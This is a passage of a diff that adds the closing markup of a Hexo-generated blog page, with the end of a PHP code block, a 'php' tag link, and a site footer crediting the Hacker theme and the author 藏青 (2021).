class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/php/">php</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
